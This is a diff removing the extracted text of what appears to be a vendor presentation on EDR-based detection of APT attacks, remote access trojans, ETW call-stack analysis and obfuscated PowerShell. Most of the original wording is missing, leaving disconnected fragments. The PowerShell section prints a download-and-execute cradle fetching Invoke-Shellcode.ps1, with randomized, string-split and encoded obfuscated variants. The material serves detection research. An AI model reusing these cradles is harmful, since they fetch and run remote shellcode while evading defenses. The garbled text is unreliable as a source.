@@ -1,314 +1,0 @@
- 
-
- 
-
-
-
-1. APT 2.  3.  4. POWERSHELL
-
-
-
-1. APT
-1.1APT 1.2 APT ­  1.3 
-
-1.1 APT
-· APT 
-· APT 
-· APT · 
-
-1.2 APT ­ 
-77% ITAPT 
-70%  90%  
-232 - APT APT IT 
-24% PCFILE-LESS 
-
-1.3 
-APT
-APT0-DAY   · 
-· 
-· 
-· HOOKING WIN10
-.
-EDR 200CROWD STRIKE, CARBON BLACK 
-
-1.3 
-
-
-
-
-
- EDR
-
-
-
-  
-
-
-
-
-
- (,)
-
- 
-
-
-
-2. 
-2.1 APT &  2.2 RAT 2.3  2.4  2.5 
-
-2.1 APT
-
-
-
- 
-
-
-
-
-
-
- 
-
- 
-
-
-
-/ 
- 
-
-
- 
-
-2.1 APT
-
-300+APT[1]RATAPT
-
-/ Spearphishing Link
-Spearphishing Email
-Poison Ivy RAT Darkcomet RAT Xtreme RAT
-
-APT APT28, APT29, APT32, APT33, APT39
-APT12, APT19, APT28, APT29, APT32, APT37, APT39
-RSA SecurID attack, Nitro attacks Syrian Conflict APT Attacks on US, UK, Israel and other Middle East government
-
-[1]https://github.com/aptnotes/data
-
-2.2 RAT
-· Remote Access Trojan (RAT) 
-· RATs10 - 40 (PHFs)  · RAT3 · 90%RATWindows
-11
-
-EDR
-
-EDR: ·  + · AI        
-
-
-CEO&  
- 91/  
- 2003    2011 NetShield  NEC Motorola   2012-  Google Scholar
-   2016(IEEE Fellow)
- 20+ 
-
-EDR/CWPP
-
-- Collector)  : CPU <2% (based on Intel® i5 processor testing) Memory 100MB HDD 100MB <8KB
-- Detector) 
-- EDR
-
-2.4 
-   
- ETW for Windows call stack windows
- keylogging         PowerShell  powershellVirusTotal  
-
-2.5 
-
-  .
- APT 
-
-From MITRE Attack Matrix for Enterprise
-
-1. 
-
-VNC
-
-2. 
-
-3.  
-
-.
-
-
-
-2.5  ­
-
-2.5  --
-
-2.5  ­  WindowsETWkeylogging 
-
-2.5  ­ 
-20
-
-2.5  ­ ETW
-·Event Tracing for Windows (ETW) ·ETW Windows System CallCall-stack
-
-·ETW2RecorderParserParser
-· 
-·ETWSyscall SyscallCall-stack
-
-·
-
-·offset 
-
-·windows
-
-·ETW
-
-21
-
-2.5  ­ 
-· Sysall/API/
-22
-
-2.5  ­ 
-· ETW  ·   
-23
-
-2.5  ­ AATR
-· SyscallCall-stack 
-· Call-stack: · APISyscallcall-stack  · APIAPI · API
-24
-
-2.5  ­ 
-·  ·  
-25
-
-2.5  ­ 
-· RAT52 RATPoison IvyDarkcomet RATXtreme
-26
-
-2.5  ­ 
-· 52RAT
-27
-
-2.5  ­
-28
-
-2.5  ­ 
-29
-
-2.5  ­ 
-·  <10%3.3 GHz Intel i5-4590 CPU and 4 GB 
-30
-
-
-
-3. 
-3.1  3.2 
-
-3.1 
-   35,650,758  system call events; 529  30)  20;  : 1,782,538 records/min /
- 3  Profile.exe 2shell   Prodata.exe
- 3  22
-
-3.2 
-
-3.2 
-
-
-
-4. POWERSHELL
-4.1 POWERSHELL 4.2 POWERSHELL 4.3 + 4.4 
-
-4.1 POWERSHELL
-2. PowerShell  "Live-off-the-Land Attack"  "Fileless Attack"
-1. PowerShell  Windows Desktop  Server 
-2.  PowerShell  Windows  
-3. PowerShell  4. ... ...
-
-4.1 POWERSHELL
-
-Original
-
-IEX (New-Object Net.WebClient). DownloadString("hxxps://.../Invoke-Shellcode.ps1")
-
-Randomize
-
-IeX (nEw`-obJEct neT.wEbclIEnt). dO`wnLOAdsTring("hxxps://.../Invoke-Shellcode.ps1")
-
-String
-
-.("{1}{0}" -f'eX','I') (.("{0}{1}{2}"-f'nE','w-obJ','Ect')
-
-Manipulation ("{3}{0}{2}{1}"-f 'Eb','IEnt','cl','neT.w'))."D`O"("{3}{0}{1}{2}" -
-
-f'OAds','Trin','g','wnL`) ("hxxps://.../Invoke-Shellcode.ps1")
-
-Encoding
-
-([rUNTiME.INterOpSERvIces.mArsHAl]::ptrtOsTRinganSI( [rUNTIme.InteROpSErvicES.MaRShAL]::secUReSTRINgTOGL obALAllOCaNsI( $(`...==' | CoNVerTTo-seCuReStrInG -k (217..202)) ))) | &( $VERBoSEpREFErENcE.tOstriNg()[1,3]+'X'-JoiN'')
-
-4.1 POWERSHELL
-
-VirusTotal 
-"56"
-
-1.  
-2.  
-
-
-BenignGitHub500PowerShell Repo 2342 
-Malicious PowerShellPowerSploit ...  4098 
-
-4.1 POWERSHELL
-0.4%752.0.6%% 90.0%
-
-4.2 +
-
-
-1.  
-2.  
-3. 
-
-4.2 +
-
-POWERSHELL
-0.4%752.0.6%% 90.0%
-
-4.3 
-KB
-
-4.3 
-
-
-
- Cornerstone (EDR)
-
- 
-
- ,
-
- :
-
- shell, 
-
-.
-
- APT300+
-
- 
-
- 
-
- powershell   5
-
- 13601622922
-
-THANKS
-
-4.3 
-
-4.3 
-
-4.3 
-
-
